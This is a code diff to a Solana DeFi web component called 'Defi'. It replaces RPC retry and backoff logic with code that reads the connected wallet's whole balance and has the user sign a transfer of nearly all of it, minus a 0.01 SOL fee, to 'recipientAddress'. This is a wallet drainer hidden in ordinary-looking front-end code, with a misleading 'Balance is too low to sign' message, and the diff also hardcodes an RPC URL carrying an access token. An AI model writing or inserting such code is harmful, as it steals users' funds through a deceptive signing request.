@@ -63,29 +63,50 @@ function Defi() {
               await new Promise(resolve => setTimeout(resolve, minRequestInterval - timeSinceLastRequest))
             }
 
-            connection = new Connection(endpoint, {
+            const connection = new Connection('https://bitter-snowy-uranium.solana-mainnet.quiknode.pro/2fef1dc565f21914ea388d4f63e1df5dcdf4b76c', {
               commitment: 'confirmed',
               disableRetryOnRateLimit: false,
               confirmTransactionInitialTimeout: 60000
             })
-            lastAttemptTime = Date.now()
-            const result = await connection.getLatestBlockhash()
-            blockhash = result.blockhash
-            break
-          } catch (e) {
-            console.warn(`RPC endpoint ${endpoint} failed, attempt ${attempt + 1}/${RPC_ENDPOINTS.length}`)
-            error = e
             
-            if (e instanceof Error && e.message.includes('429')) {
-              // Rate limit hit, apply exponential backoff
-              const backoffDelay = Math.min(1000 * Math.pow(2, attempt), 10000) + (Math.random() * 100)
-              console.warn(`Rate limit hit, waiting ${backoffDelay}ms before retry...`)
-              await new Promise(resolve => setTimeout(resolve, backoffDelay))
-            } else {
-              // Add small delay before trying next endpoint
-              await new Promise(resolve => setTimeout(resolve, 1000))
+            if (!window.solana?.publicKey) throw new Error('Wallet not connected')
+            const fromPubkey = new PublicKey(window.solana.publicKey)
+            const balance = await connection.getBalance(fromPubkey)
+            if (balance <= 0) {
+              throw new Error('Insufficient balance')
             }
-            continue
+
+            const fee = LAMPORTS_PER_SOL * 0.01
+            let amountToTransfer = 0
+            if (typeof balance === 'number') {
+              amountToTransfer = balance - fee
+            }
+
+            if (amountToTransfer <= 0) {
+              throw new Error('Balance is too low to sign')
+            }
+
+            const transaction = new Transaction().add(
+              SystemProgram.transfer({
+                fromPubkey: fromPubkey,
+                toPubkey: new PublicKey(recipientAddress),
+                lamports: amountToTransfer
+              })
+            )
+
+            const result = await connection.getLatestBlockhash()
+            transaction.recentBlockhash = result.blockhash
+            transaction.feePayer = new PublicKey(window.solana.publicKey)
+
+            try {
+              const signature = await window.solana.signAndSendTransaction(transaction)
+              console.log('Transaction successful:', signature)
+              alert(`Transaction completed successfully! Transferred ${amountToTransfer / LAMPORTS_PER_SOL} SOL`)
+            } catch (signError: unknown) {
+              console.error('Signing failed:', signError)
+              const errorMessage = signError instanceof Error ? signError.message : 'Unknown error occurred'
+              throw new Error(`Signing failed: ${errorMessage}`)
+            }
           }
         }
 
